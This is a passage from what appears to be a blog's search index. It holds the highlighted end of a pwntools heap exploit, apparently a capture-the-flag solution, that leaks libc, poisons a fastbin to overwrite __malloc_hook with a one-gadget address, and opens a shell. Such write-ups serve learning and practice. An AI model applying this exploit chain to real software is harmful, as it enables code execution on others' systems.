number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>fill<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>fill<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>malloc_hook<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">88</span><span class="token operator">-</span><span class="token number">0x10</span></pre></td></tr><tr><td data-num="54"></td><td><pre>libc_base<span class="token operator">=</span>malloc_hook<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4aed</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre>fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre>payload<span class="token operator">=</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>fill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>pause<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>allocate<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
